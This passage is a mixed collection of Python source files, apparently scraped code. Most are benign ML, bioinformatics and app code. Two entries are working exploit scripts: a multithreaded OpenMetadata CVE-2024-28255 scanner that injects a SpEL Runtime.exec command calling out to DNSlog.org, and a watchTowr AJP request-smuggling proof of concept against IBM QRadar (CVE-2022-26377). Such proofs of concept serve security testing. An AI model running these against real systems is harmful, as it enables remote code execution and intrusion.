return diagnosis\n\n\n# def diagnose(symptoms: schema.UserSymptoms):\n\n#     kb = FolKB()\n\n#     for rule in rules.values():\n#         kb.tell(expr(rule))\n\n#     kb.tell(expr(f'Symptom(x, \"{symptoms.symptom1}\")'))\n#     kb.tell(expr(f'Symptom(x, \"{symptoms.symptom2}\")'))\n#     kb.tell(expr(f'Symptom(x, \"{symptoms.symptom3}\")'))\n\n#     problems = [\n#         \"CPU Problem\",\n#         \"RAM Problem\",\n#         \"GPU Problem\",\n#         \"Power Supply Problem\",\n#         \"Motherboard Problem\",\n#         \"Hard Drive Problem\",\n#         \"Network Card Prob",
    "import gc\n\nimport torch\nfrom torch import nn\n\nfrom bitlinear import BitLinear, InferenceLinear\n\n\n# Adapt from https://github.com/kyegomez/BitNet/blob/main/bitnet/replace_hf.py\ndef replace_linear_in_hf(model, keep_param: bool, custom_kernel=False):\n    \"\"\"\n    Replaces all instances of nn.Linear in the given model with BitLinear, except lm_head.\n\n    Args:\n        model (nn.Module): The model to modify.\n\n    Returns:\n        None\n        :param custom_kernel: default False, if true, it will use the custom kernel to replace the linear layer.\n        :param model: The model to modify.\n        :param keep_param: if ture, the model will keep param from the initial model.\n        if false, the model will be using random init weight (For training)\n    \"\"\"\n    for name, module in model.named_children():\n        if isinstance(module, nn.Linear):\n            if 'head' in name:\n                continue\n            # Create a new BitLinear layer with random parameters\n            if not custom_kernel:\n                bit_linear = BitLinear(\n                    in_features=module.in_features,\n                    out_features=module.out_features,\n                    bias=module.bias is not None,\n                    dtype=module.weight.dtype,\n                )\n            else:\n                bit_linear = InferenceLinear(\n                    in_features=module.in_features,\n                    out_features=module.out_features,\n                    bias=module.bias is not None,\n                    dtype=module.weight.dtype,\n                )\n\n            if keep_param:\n                # Transfer the weights and bias from the original nn.Linear to the new BitLinear\n                data = module.weight.data\n                bit_linear.weight.data.copy_(data)\n                if module.bias is not None:\n                    bit_linear.bias.data.copy_(module.bias.data)\n\n            if custom_kernel:\n                bit_linear.quantize_weight()\n\n            del module\n\n            # Replace the nn.Linear with the new BitLinear\n            setattr(model, name, bit_linear)\n        else:\n            # Recursively apply to child modules\n            replace_linear_in_hf(module, keep_param, custom_kernel=custom_kernel)\n    gc.collect()\n    if torch.cuda.is_available():\n        torch.cuda.empty_cache()\n",
    "import argparse\r\nimport requests\r\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\r\nimport base64\r\nimport concurrent.futures\r\n\r\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\r\n\r\ncommand = \"nslookup DNSlog.org\"\r\n\r\n\r\n\r\nbanner='''\r\n   _______      ________    ___   ___ ___  _  _        ___   ___ ___  _____ _____ \r\n  / ____\\ \\    / /  ____|  |__ \\ / _ \\__ \\| || |      |__ \\ / _ \\__ \\| ____| ____|\r\n | |     \\ \\  / /| |__ ______ ) | | | | ) | || |_ ______ ) | (_) | ) | |__ | |__  \r\n | |      \\ \\/ / |  __|______/ /| | | |/ /|__   _|______/ / > _ < / /|___ \\|___ \\ \r\n | |____   \\  /  | |____    / /_| |_| / /_   | |       / /_| (_) / /_ ___) |___) |\r\n  \\_____|   \\/   |______|  |____|\\___/____|  |_|      |____|\\___/____|____/|____/ \r\n                                                                                  \r\n                                                                                  \r\n                                                        PowerBy:YongYe_Security\r\n\r\n'''\r\n\r\ndef check_target(target_url):\r\n    encoded_command = base64.b64encode(command.encode()).decode()\r\n    url = f\"{target_url}/api/v1;v1%2fusers%2flogin/events/subscriptions/validation/condition/T(java.lang.Runtime).getRuntime().exec(new%20java.lang.String(T(java.util.Base64).getDecoder().decode(%22{encoded_command}%22)))\"\r\n    headers = {\r\n        \"User-Agent\": \"Mozilla/6.0 (Windows NT 11.0; Win64; x64; rv:124.0) Gecko/20910121 Firefox/944.3\",\r\n        \"Connection\": \"close\"\r\n    }\r\n    \r\n    try:\r\n        response = requests.get(url, headers=headers, verify=False, timeout=5)\r\n        if response.status_code == 400 and \"Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.Boolean\" in response.text:\r\n            print(f\"\\t[*]{target_url}\")\r\n            with open('result.txt','a') as f:\r\n                f.write(f'{target_url}\\n')\r\n    except requests.exceptions.RequestException:\r\n        pass\r\n\r\ndef multithreadings(file_path, threads):\r\n    with open(file_path, 'r') as file:\r\n        targets = [line.strip() for line in file]\r\n        target_url = [\"https://\" + line if not line.startswith(\"http\") else line for line in targets]\r\n    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:\r\n        executor.map(check_target, target_url)\r\n\r\nif __name__ == \"__main__\":\r\n    print(banner)\r\n    parser = argparse.ArgumentParser(description='Python3 CVE-2024-28255.py -f url.txt -t 50')\r\n    group = parser.add_mutually_exclusive_group(required=True)\r\n    group.add_argument('-u', dest='target', help='target URL')\r\n    group.add_argument('-f', dest='file', help='target File')\r\n    parser.add_argument('-t', dest='threads', type=int, default=10, help='number of threads')\r\n    args = parser.parse_args()\r\n    print('='*35+' Start Scanning '+'='*35)\r\n    if args.target:\r\n        target_url = args.target\r\n        check_target(target_url)\r\n    elif args.file:\r\n        multithreadings(args.file, args.threads)\r\n",
    "import torch\nfrom torchvision.transforms import Resize\nfrom torchvision.transforms.functional import gaussian_blur\n\nimport numpy as np\n\n# Code largely adapted from https://github.com/ouyangzhibo/Image_Foveation_Python.git and rewritten to use PyTorch\n\ndef _Gaussian_pyramid(im, kernel_size=5, sigmas=[], num_levels=6):\n    A = torch.clone(im)\n    pyramids = [A]\n    \n    _, height_original, width_original = im.shape\n    \n    # Apply Gaussian blur to every level (except 0) and downsample by factor of 2\n    for i in range(1, num_levels):\n        A = gaussian_blur(A, kernel_size=kernel_size, sigma=sigmas[i])\n\n        _, height, width = A.shape\n        A = Resize((int(height/2), int(width/2)))(A)\n\n        pyramids.append(A)\n\n    # Upsample every level (except 0) by factor of 2 until reaching original size\n    for i in range(1, num_levels):\n        A = pyramids[i]\n        for j in range(i):\n            if j < i-1:\n                new_size = (A.shape[1]*2, A.shape[2]*2)\n            else:\n                new_size = (height_original, width_original)\n\n            A = Resize(new_size)(A)\n            # P = gaussian_blur(A, kernel_size=kernel_size, sigma=sigmas[i])\n        pyramids[i] = A\n\n    return pyramids\n\ndef foveate_image(im, fovea_pos):\n    num_levels = 6\n    # sigmas = [0.248, 0.124, 0.056, 0.0267, 0.0131, 0.00654]  # standard deviation of the Gaussian distribution\n    sigmas = [0.248]  # standard deviation of the Gaussian distribution\n    if len(sigmas) == 1:\n        sigmas = np.repeat(sigmas[0], num_levels)\n\n    p = 3.5  # number of pixels a person can see in a degree of visual angle\n    alpha = 2.5  # half-height angle: when \u03b8(x, y) = \u03b1, the image will become only half the resolution of the center of attention\n\n    # Fixation\n    x_focus, y_focus = fovea_pos\n    \n    GP = _Gaussian_pyramid(im, num_levels=num_levels, sigmas=sigmas)\n\n    x = torch.arange(0, im.shape[2], 1, dtype=torch.float32)\n    y = torch.arange(0, im.shape[1], 1, dtype=torch.float32)\n    x_2d, y_2d = torch.meshgrid(x, y, indexing='ij')\n\n    # Map image coordinates to visual angles\n    theta = torch.sqrt((x_2d - x_focus) ** 2 + (y_2d - y_focus) ** 2) / p\n\n    # Resolution map\n    R = alpha / (theta + alpha)  # shape [width, height]; values between 1 (at center of fovea) and 0\n    \n    # Transfer functions\n    Ts = []\n    for i in range(1, num_levels):\n        Ts.append(torch.exp(-((2 ** (i-3)) * R / sigmas[i-1]) ** 2 * 0.5))\n    Ts.append(torch.zeros_like(R))  # equal to 0 for i == num_levels\n    \n    # Bandwidths where Ti(omegai) = 0.5\n    omegas = torch.zeros(num_levels)\n    for i in range(1, num_levels):\n        omegas[i - 1] = (sigmas[i - 1] * torch.sqrt(torch.log(torch.tensor(2)))) / (2 ** (i - 3) * torch.sqrt(torch.tensor(0.5)))\n    omegas[-1] = torch.tensor(0)\n\n    # Normalize bandwidths\n    omegas_norm = []\n    omega_max = torch.max(omegas)\n    omega_min = torch.min(omegas)\n    for omega in omegas:\n        omegas_norm.append((omega - omega_min) / (omega_max - omega_min))\n\n    # Layer numbers\n    layer_numbers = torch.zeros_like(R)\n    for i in range(1, num_levels):\n        i0 = torch.logical_and(R >= omegas_norm[i], R <= omegas_norm[i - 1])\n        layer_numbers[i0] = i\n    layer_numbers = layer_numbers.type(torch.IntTensor)\n\n    # Blending functions\n    Bs = []\n    for i in range(1, num_levels):\n        Bs.append((0.5 - Ts[i]) / (Ts[i-1] - Ts[i] + 1e-5))  # 1e-5 to avoid division by 0\n    \n    # Blending coefficients\n    Ms = torch.zeros((num_levels, R.shape[0], R.shape[1]))\n    for i in range(1, num_levels + 1):\n        index = layer_numbers == i\n        if torch.sum(index) > 0:\n            if i == 1:\n                Ms[i-1][index] = 1\n            else:\n                Ms[i-1][index] = 1 - Bs[i-1][index]\n\n        index = layer_numbers - 1 == i\n        if torch.sum(index) > 0:\n            Ms[i-1][index] = Bs[i][index]\n\n    # Generate foveated image\n    im_fov = torch.zeros_like(GP[0], dtype=torch.float32)\n    # Linear combination of Ms and As\n    for index, (M, A) in enumerate(zip(Ms, GP)):\n        for color in range(im.shape[0]):\n            im_fov[color, :, :] += torch.multiply(M.T, A[color, :, :])\n    # im_fov = im_fov.type(torch.IntTensor)\n\n    im_fov = torch.clamp(im_fov, 0, 1)\n\n    # print('Num full-res pixels', torch.sum(Ms[0] == 1))\n\n    fovea_mask = torch.where((Ms[0] == 1), 0, 1)  # 0 where fovea is, 1 in periphery\n\n    return im_fov, fovea_mask\n",
    "#!/usr/bin/env python\n\n# This script is used to identify *.nf.test files for changed functions/processs/workflows/pipelines and *.nf-test files\n# with changed dependencies, then return as a JSON list\n\nimport argparse\nimport json\nimport logging\nimport os\nimport re\nimport yaml\n\nfrom git import Repo\nfrom pathlib import Path\n\n\ndef parse_args() -> argparse.Namespace:\n    \"\"\"\n    Parse command line arguments and return an ArgumentParser object.\n\n    Returns:\n        argparse.ArgumentParser: The ArgumentParser object with the parsed arguments.\n    \"\"\"\n    parser = argparse.ArgumentParser(\n        description=\"Scan *.nf.test files for function/process/workflow name and return as a JSON list\"\n    )\n    parser.add_argument(\n        \"-p\",\n        \"--path\",\n        help=\"Path to scan for nf-test files. Should be root of repository.\",\n        default=\".\",\n    )\n    parser.add_argument(\n        \"-r\",\n        \"--head_ref\",\n        required=True,\n        help=\"Head reference branch (Source branch for a PR).\",\n    )\n    parser.add_argument(\n        \"-b\",\n        \"--base_ref\",\n        required=True,\n        help=\"Base reference branch (Target branch for a PR).\",\n    )\n    parser.add_argument(\n        \"-x\",\n        \"--ignored_files\",\n        nargs=\"+\",\n        default=[\n            \".git/*\",\n            \".gitpod.yml\",\n            \".prettierignore\",\n            \".prettierrc.yml\",\n            \"*.md\",\n            \"*.png\",\n            \"modules.json\",\n            \"pyproject.toml\",\n            \"tower.yml\",\n        ],\n        help=\"List of files or file substrings to ignore.\",\n    )\n    parser.add_argument(\n        \"-i\",\n        \"--include\",\n        type=Path,\n        default=None,\n        help=\"Path to an include file containing a YAML of key value pairs to include in changed files. I.e., return the current directory if an important file is changed.\",\n    )\n    parser.add_argument(\n        \"-l\",\n        \"--log-level\",\n        choices=[\"DEBUG\", \"INFO\", \"WARNING\", \"ERROR\"],\n        type=str,\n        default=\"INFO\",\n        help=\"Logging level\",\n    )\n    parser.add_argument(\n        \"-t\",\n        \"--types\",\n        type=str,\n        default=\"function,process,workflow,pipeline\",\n        help=\"Types of tests to include.\",\n    )\n    parser.add_argument(\n        \"-n\",\n        \"--n_parents\",\n        type=int,\n        default=0,\n        help=\"Number of parents to up to return. 0 for file, 1 for immediate dir, 2 for parent dir, etc.\",\n    )\n    return parser.parse_args()\n\n\ndef read_yaml_inverted(file_path: str) -> dict:\n    \"\"\"\n    Read a YAML file and return its contents as a dictionary but reversed, i.e. the values become the keys and the keys become the values.\n\n    Args:\n        file_path (str): The path to the YAML file.\n\n    Returns:\n        dict: The contents of the YAML file as a dictionary inverted.\n    \"\"\"\n    with open(file_path, \"r\") as f:\n        data = yaml.safe_load(f)\n\n    # Invert dictionary of lists into contents of lists are keys, values are the original keys\n    # { \"key\": [\"item1\", \"item2] } --> { \"item1\": \"key\", \"item2\": \"key\" }\n    return {value: key for key, values in data.items() for value in values}\n\n\ndef find_changed_files(\n    path: Path,\n    branch1: str,\n    branch2: str,\n    ignore: list[str],\n) -> list[Path]:\n    \"\"\"\n    Find all *.nf.tests that are associated with files that have been changed between two specified branches.\n\n    Args:\n        repo (Path)        : Path to the repository to scan.\n        branch1 (str)      : The first branch being compared\n        branch2 (str)      : The second branch being compared\n        ignore  (list)     : List of files or file substrings to ignore.\n\n    Returns:\n        list: List of files matching the pattern *.nf.test that have changed between branch2 and branch1.\n    \"\"\"\n\n    # Initialise repo for scanning\n    repo = Repo(path)\n\n    # identify commit on branch1\n    branch1_commit = repo.commit(branch1)\n    # identify commit on branch2\n    branch2_commit = repo.commit(branch2)\n    # compare two branches\n    diff_index = branch1_commit.diff(branch2_commit)\n\n    # Start empty list of changed files\n    changed_files = []\n\n    # For every file that has changed between commits\n    for file in diff_index:\n        # Get pathlib.Path object\n        filepath = Path(file.a_path)\n        # If file does not match any in the ignore list, add containing directory to changed_files\n        if not any(filepath.match(ignored_path) for ignored_path in ignore):\n            # Prepend the root of the path for better scanning\n            changed_files.append(path.joinpath(filepath))\n\n    # Uniqueify the results before returning for efficiency\n    return list(set(changed_files))\n\n\ndef detect_include_files(\n    changed_files: list[Path], include_files: dict[str, str]\n) -> list[Path]:\n    \"\"\"\n    Detects the include files based on the changed files.\n\n    Args:\n        changed_files (list[Path]): List of paths to the changed files.\n        include_files (dict[str, str]): Key-value pairs to retu",
    "from get_inference_service import InferenceServerManager\nimport asyncio\nimport subprocess\nimport os\nimport json\n\nfrom openai import OpenAI\n\n\n## let's say you want to use the InferenceServerManager class to get all of the available models\n## you can do the following:\nall_available_models_query = {\n    \"name\": \"\",\n    \"quantization\": \"\",\n    \"use_regex_model_name\": False,\n    \"use_regex_quantization\": False\n}\n\n\ndef new_server_cb(model):\n    print(f\"New server available: {model}\")\n    ## here's where we could, for example, call a subprocess out to whatever other python script\n    ## capture the output and print it to the console\n    \n    ## the base_url is the url we fetched from the NATS server\n    client = OpenAI(base_url=model.get(\"url\"), api_key=\"multiverse\")\n    print(model)\n    \n    ## now, in this function, you can actually send a request to the server to get the model\n    completion = client.chat.completions.create(\n            messages=[\n                {\"role\": \"system\", \"content\": \"You are a helpful assistant.\"},\n                {\"role\": \"user\", \"content\": \"Please tell me a joke about AIs\"}\n            ],\n            model=model.get(\"name\"),\n            temperature=0.7,\n        )\n    ## do whatever you want with the completion\n    content = completion.choices[0].message.content\n    print(content)\n    \n    ## your code here...\n    return content\n    \ndef server_unavailable_cb(model):\n    print(f\"Server unavailable: {model}\")\n    ## your code to handle de-registering a server here...\n    return\n\n\nasync def main():\n    manager = InferenceServerManager(all_available_models_query)\n    await manager.connect()\n    await manager.listen_for_response(new_server_cb=new_server_cb, server_unavailable_cb=server_unavailable_cb)  # Listen for responses before we make requests\n    await manager.update_servers()  # Initialize and make requests\n    try:\n        await asyncio.Future()  # Keep the loop running indefinitely\n    except KeyboardInterrupt:\n        print(\"Shutting down...\")\n    finally:\n        await manager.close()  # Properly close NATS connection\n\nif __name__ == '__main__':\n    \n    asyncio.run(main())\n\n",
    "import requests\nimport re\nimport base64\nimport argparse\nimport socket, sys, ssl, time\nimport binascii\nimport time\n\nbanner = \"\"\"\t\t\t __         ___  ___________                   \n\t __  _  ______ _/  |__ ____ |  |_\\\\__    ____\\\\____  _  ________ \n\t \\\\ \\\\/ \\\\/ \\\\__  \\\\    ___/ ___\\\\|  |  \\\\|    | /  _ \\\\ \\\\/ \\\\/ \\\\_  __ \\\\\n\t  \\\\     / / __ \\\\|  | \\\\  \\\\___|   Y  |    |(  <_> \\\\     / |  | \\\\/\n\t   \\\\/\\\\_/ (____  |__|  \\\\___  |___|__|__  | \\\\__  / \\\\/\\\\_/  |__|   \n\t\t\t\t  \\\\/          \\\\/     \\\\/                            \n\t  \n        watchtowr-vs-ibm_qradar_2024-04-12.py\n          - Sonny, watchTowr (sonny@watchTowr.com)\n        CVEs: [CVE-2022-26377]  \"\"\"\n\nhelptext =  \"\"\"\n            Example Usage:\n          - python watchtowr-vs-ibm_qradar_2024-04-12 --url http://localhost\n\n\t\t\t \"\"\"\nproxies = {\n   'http': 'http://127.0.0.1:8081',\n   'https': 'http://127.0.0.1:8081',\n}\n\n\nparser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)\nparser.add_argument(\"--url\", help=\"target url in the format https://localhost\", default=False, action=\"store\", required=True)\ntry:\n    args = parser.parse_args()\nexcept:\n    print(banner)\n    print(helptext)\n    raise\n\nprint(banner)\nrequests.urllib3.disable_warnings()\nprint(f\"[*] Target Server: {args.url} \")\n\nheaders = {\n  \"Content-Type\": \"application/x-www-form-urlencoded\",\n  \"Transfer-Encoding\": \"chunked, chunked\"\n}\npayload_hex = \"0008485454502f312e3100000b2f636f6e736f6c652f78780000093132372e302e302e310000026c6f0000076c6f63616c7874000050000003000154000020424242424242424242424242424242424242424242424242424242424242424200000a5741544348544f5752300000013000a00b000d7761746368746f77722e636f6d00030062626262620005016262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262653d00ff00\"\ndata = b\"204\\r\\n\" + binascii.unhexlify(payload_hex) + b\"\\r\\n0\\r\\n\\r\\n\"\n\nfor i in range(300):\n    \n    green_color_code = '\\033[92m'\n    vuln_text = \"[*] Host is vulnerable, poison consumed\"\n    reset_color_code = '\\033[0m'\n    # Your sequence here\n    print(f\"[*] Sending Poison \")\n    \n    try:\n      response = requests.post(f\"{args.url}/console/watchTowr\", data=data, timeout=5, verify=False, headers=headers)\n    except:\n        1+1\n    if \"watchtowr\" in str(response.headers):\n        print(green_color_code + vuln_text + reset_color_code)\n    time.sleep(1)\n",
    "import copy\nimport glob\nimport os\nfrom pathlib import Path\nimport cv2\nimport torch\nimport torch.nn as nn\nimport torchvision.transforms as T\nimport argparse\nfrom PIL import Image\nimport yaml\nfrom tqdm import tqdm\nfrom transformers import logging\nfrom diffusers import DDIMScheduler, StableDiffusionPipeline\n\nfrom pnp_utils_combine import *\n\n# suppress partial model loading warning\nlogging.set_verbosity_error()\n\nclass PNP(nn.Module):\n    def __init__(self, config):\n        super().__init__()\n        self.config = config\n        self.device = config[\"device\"]\n        sd_version = config[\"sd_version\"]\n\n        if sd_version == '2.1':\n            model_key = \"stabilityai/stable-diffusion-2-1-base\"\n        elif sd_version == '2.0':\n            model_key = \"stabilityai/stable-diffusion-2-base\"\n        elif sd_version == '1.5':\n            model_key = \"runwayml/stable-diffusion-v1-5\"\n        else:\n            raise ValueError(f'Stable-diffusion version {sd_version} not supported.')\n\n        # Create SD models\n        print('Loading SD model')\n\n        pipe = StableDiffusionPipeline.from_pretrained(model_key, torch_dtype=torch.float16).to(\"cuda\")\n        pipe.enable_xformers_memory_efficient_attention()\n\n        self.vae = pipe.vae\n        self.tokenizer = pipe.tokenizer\n        self.text_encoder = pipe.text_encoder\n        self.unet = pipe.unet\n\n        self.scheduler = DDIMScheduler.from_pretrained(model_key, subfolder=\"scheduler\")\n        self.scheduler.set_timesteps(config[\"n_timesteps\"], device=self.device)\n        print('SD model loaded')\n\n        # load image\n        self.image, self.eps = self.get_data()\n\n        self.text_embeds = self.get_text_embeds(config[\"prompt\"], config[\"negative_prompt\"])\n        self.pnp_guidance_embeds = self.get_text_embeds(\"\", \"\").chunk(2)[0]\n\n        self.unet_lora_list = []\n\n    @torch.no_grad()\n    def get_text_embeds(self, prompt, negative_prompt, batch_size=1):\n        # Tokenize text and get embeddings\n        text_input = self.tokenizer(prompt, padding='max_length', max_length=self.tokenizer.model_max_length,\n                                    truncation=True, return_tensors='pt')\n        text_embeddings = self.text_encoder(text_input.input_ids.to(self.device))[0]\n\n        # Do the same for unconditional embeddings\n        uncond_input = self.tokenizer(negative_prompt, padding='max_length', max_length=self.tokenizer.model_max_length,\n                                      return_tensors='pt')\n\n        uncond_embeddings = self.text_encoder(uncond_input.input_ids.to(self.device))[0]\n\n        # Cat for final embeddings\n        text_embeddings = torch.cat([uncond_embeddings] * batch_size + [text_embeddings] * batch_size)\n        return text_embeddings\n\n    @torch.no_grad()\n    def decode_latent(self, latent):\n        with torch.autocast(device_type='cuda', dtype=torch.float32):\n            latent = 1 / 0.18215 * latent\n            img = self.vae.decode(latent).sample\n            img = (img / 2 + 0.5).clamp(0, 1)\n        return img\n\n    @torch.autocast(device_type='cuda', dtype=torch.float32)\n    def get_data(self):\n        # load image\n        image = Image.open(self.config[\"image_path\"]).convert('RGB') \n        image = image.resize((512, 512), resample=Image.Resampling.LANCZOS)\n        image = T.ToTensor()(image).to(self.device)\n        # get noise\n        latents_path = os.path.join(self.config[\"latents_path\"], os.path.splitext(os.path.basename(self.config[\"image_path\"]))[0], f'noisy_latents_{self.scheduler.timesteps[0]}.pt')\n        noisy_latent = torch.load(latents_path).to(self.device)\n        return image, noisy_latent\n\n    @torch.no_grad()\n    def denoise_step(self, x, t):\n        # register the time step and features in pnp injection modules\n        source_latents = load_source_latents_t(t, os.path.join(self.config[\"latents_path\"], os.path.splitext(os.path.basename(self.config[\"image_path\"]))[0]))\n        latent_model_input = torch.cat([source_latents] + ([x] * 2))\n\n        register_time(self.unet, t.item())\n        for unet_lora in self.lora_list:\n            register_time(unet_lora, t.item())\n\n        # compute text embeddings\n        text_embed_input = torch.cat([self.pnp_guidance_embeds, self.text_embeds], dim=0)\n\n        # apply the denoising network\n        #print(self.unet)\n        noise_pred = self.unet(latent_model_input, t, encoder_hidden_states=text_embed_input)['sample']\n\n\n        for i in range(0,len(self.lora_text_embeds_list)):\n            text_embed_input = torch.cat([self.pnp_guidance_embeds, self.lora_text_embeds_list[i]], dim=0)\n            noise_pred_lora = self.lora_list[i](latent_model_input, t, encoder_hidden_states=text_embed_input)['sample']\n            noise_pred[:,:,self.mask_list[i]] = noise_pred_lora[:,:,self.mask_list[i]]\n\n        # perform guidance\n        _, noise_pred_uncond, noise_pred_cond = noise_pred.chunk(3)\n        noise_pred = noise_pred_uncond + self.config[\"guidance_scale\"] * (noise_pred_cond - noise_pred_uncond)\n\n        # compu",
    "import random\nimport numpy as np\nimport copy\n\nclass Task:\n    def __init__(self, dealine: int, time: int, profit: int | float) -> None:\n        self.deadline = dealine\n        self.time = time\n        self.profit = profit\n\n    def __repr__(self) -> str:\n        return f\"|{self.deadline}, {self.time}, {self.profit:.2f}|\"\n\nclass Problem:\n    def __init__(self, tasks: list[Task], worker_count: int, deadline: int) -> None:\n        self.tasks = tasks\n        self.worker_count = worker_count\n        self.deadline = deadline\n        self.used_problems = [False for _ in range(len(tasks))]\n        self.solution_matrix = np.zeros((worker_count, len(tasks), deadline))\n        self.profit = 0\n\n    def __repr__(self) -> str:\n        rep = f\"{self.worker_count} workers \\n {self.dealine} absolute dealine \\n {len(tasks)} tasks \\n\"\n        for task in tasks:\n            rep += f\"{str(task)}, \"\n        return rep\n    \ndef generateTasks(count:int, work_dealine: int, maxprofit: int | float) -> list[Task]:\n    tasks = []\n    for _ in range(count):\n        deadline, profit = random.randint(1, work_dealine), random.random() * maxprofit\n        time = max(deadline - random.randint(0, deadline), 1)\n        tasks.append(Task(deadline, time, profit))\n\n    return tasks\n\ndef generateRandom(tasks: list[Task], worker_count: int, deadline: int, worker_tries: int) -> Problem:\n    '''\n    Generates random solution. For each task it tries to fit it randomly into any worker's timeline ``worker_tries`` times.\n    Upon failure of fitting task, skips to next task.\n    '''\n\n    problem = Problem(tasks, worker_count, deadline)\n    matrix = problem.solution_matrix\n    workers_timeline = np.zeros((worker_count, deadline))\n\n    # for each task\n    for task_idx, task in enumerate(tasks):\n        \n        # generate random start time for each task in the interval <0, deadline - time> and try to fit it into any agent\n        for worker in range(worker_count):\n\n            break_worker = False\n            \n            # how many times we will try to fit the task to each worker\n            for _ in range(worker_tries):\n                \n                # select random time\n                start = random.randint(0, task.deadline - task.time)\n                can_fit_task = True\n\n                # if worker is busy during this time\n                if np.any(workers_timeline[worker, start : start + task.time]):\n                    can_fit_task = False\n\n                # if we can fit this task\n                if can_fit_task:\n\n                    problem.used_problems[task_idx] = True\n                    workers_timeline[worker, start : start + task.time] = 1\n                    matrix[worker, task_idx, start] = 1\n                    break_worker = True\n                    problem.profit += task.profit\n\n                    break\n\n            # if we managed to fit the task we can go to next task\n            if break_worker:\n                break\n    \n    return problem\n\ndef generateBasedPPT(tasks: list[Task], worker_count: int, deadline: int):\n    '''\n    First sort the tasks using ``task.pay / task.time`` metric. After that iterate over tasks and\n    try to fit the task to any worker starting from <dealine - time, deadline> and going down to\n    <deadline - time - 1, deadline - 1> and so on.\n    '''\n\n    tasks.sort(key=lambda x: x.profit/x.time, reverse=True)\n\n    problem = Problem(tasks, worker_count, deadline)\n    matrix = problem.solution_matrix\n    workers_timeline = np.zeros((worker_count, deadline))\n\n    for task_idx, task in enumerate(tasks):\n\n        for worker in range(worker_count):\n\n            break_worker = False\n            start = task.deadline - task.time\n\n            while start >= 0:\n\n                # if the worker is busy try to fit it earlier\n                if np.any(workers_timeline[worker][start : start + task.time]):\n                    start -= 1\n                    continue\n\n                workers_timeline[worker][start : start + task.time] = 1\n                problem.used_problems[task_idx] = True\n                matrix[worker, task_idx, start] = 1\n                problem.profit += task.profit\n                break_worker = True\n\n                break\n\n            \n            if break_worker:\n                break\n    \n    return problem\n\ndef checkSolution(problem: Problem):\n    \n    # check if the task is assigned only once\n    for i in range(len(problem.tasks)):\n        if not 0 <= np.sum(problem.solution_matrix[:, i, :]) <= 1:\n            print(\"Failed at: Check 1\")\n            return False\n        \n    # check if the the task is assigned before its deadline\n    for i in range(len(problem.tasks)):\n        for j in range(problem.worker_count):\n\n            idx = np.where(problem.solution_matrix[j, i] == 1)\n            if len(idx[0]) >= 1:\n                time_start = idx[0][0]\n                if time_start + problem.tasks[i].time > problem.tasks[i].deadline:\n                    print(\"Failed at: Check 2\")\n                    re",
    "import os\nimport gradio as gr\nimport json\nimport re\nfrom datetime import datetime\nimport openai\nimport random\nfrom html2image import Html2Image\n\nuser_db = { \n           os.environ[\"username\"]: os.environ[\"password\"],\n          }\n\nmusic_files = [\n    \"RPReplay_Final1712757356.mp3\",\n    \"RPReplay_Final1712801927.mp3\",\n    \"RPReplay_Final1712802362.mp3\",\n    \"RPReplay_Final1712802406.mp3\",\n    \"RPReplay_Final1712757356.mp3\",\n    \"RPReplay_Final1712802448.mp3\",\n    \"RPReplay_Final1712802599.mp3\"\n]\n\n# Function to play background music\ndef play_music():\n    \"\"\"Returns the path to the music file and makes the audio player visible.\"\"\"\n    music_path = random.choice(music_files)\n    return music_path, gr.update(visible=True)\n\n\n# Main function to generate a cocktail recipe based on user preferences\ndef generate_cocktail(mood, sweetness, sour, savory, bitter, flavor_association, drinking_experience, soberness_level, allergies, additional_requests):\n    \"\"\"Generates a cocktail recipe using OpenAI's GPT-4 based on user input.\"\"\"\n    client = openai.OpenAI(api_key=os.environ[\"API_TOKEN\"])\n    instruction = \"Please provide a cocktail recipe given the mood and preference of the user.\\n\\n\"\n    user_prompt = f\"Mood: {mood}\\nTaste: Sweetness {sweetness}/10, Sour {sour}/10, Savory {savory}/10, Bitter {bitter}/10\\nFlavor: {flavor_association}\\nDrinking Experience: {drinking_experience}\\nLevel of Soberness: {soberness_level}\\nAllergies: {allergies}\\nAdditional Requests: {additional_requests}\\n\\nMake sure to avoid all allergic ingredients.\\n\\n\"\n    output_format = \"Please strictly follow this output format:\\n\\nCocktail Name:[name]\\nQuote:[one sentence quote related to the cocktail and the mood description]\\nIngredients:[ingredient 1]\\n[ingredient 2]\\n...\\nInstruction:1. [step 1]\\n2. [step 2]\\n...\\nNotes:[notes]\"\n    prompt = instruction + user_prompt + output_format\n\n    messages=[\n        {\"role\": \"system\", \"content\": \"You are a helpful bartender assistant.\"},\n        {\"role\": \"user\", \"content\": prompt}\n    ]\n    try:\n        response = client.chat.completions.create(\n            model=\"gpt-4-0125-preview\", \n            messages=messages,\n            max_tokens=1024)\n        name, quote, ingredients, instruction, notes = extract_info(response.choices[0].message.content)\n        return format_cocktail_output(name, quote, ingredients, instruction, notes), True\n    except Exception as e:\n        return f'<p style=\"color: white; font-size: 20px;\">{str(e)}</p>', True\n\n# Extract information from the response generated by OpenAI\ndef extract_info(output_text):\n    \"\"\"Extracts the cocktail recipe information from the response text.\"\"\"\n    pattern = r\"Cocktail Name:(.*?)Quote:(.*?)Ingredients:(.*?)Instruction:(.*?)Notes:(.*?)$\"\n    match = re.search(pattern, output_text, re.DOTALL)\n    if match:\n        name = match.group(1).strip()\n        quote = match.group(2).strip()\n        ingredients = match.group(3).strip().replace('\\n', '<br>')\n        instruction = match.group(4).strip().replace('\\n', '<br>')\n        notes = match.group(5).strip()\n        return name, quote, ingredients, instruction, notes\n    else:\n        return None\n\n# Format the cocktail recipe for display\ndef format_cocktail_output(name, quote, ingredients, instruction, notes):\n    \"\"\"Formats the cocktail recipe into HTML for display.\"\"\"\n    html_output = f'''\n    <div style=\"text-align: center; font-family: 'Verdana', sans-serif; color: white;\">\n        <h1 style=\"font-size: 48px; color: white;\">{name}</h1>\n        <p style=\"font-size: 36px; margin-top: -15px; font-style: italic; color: 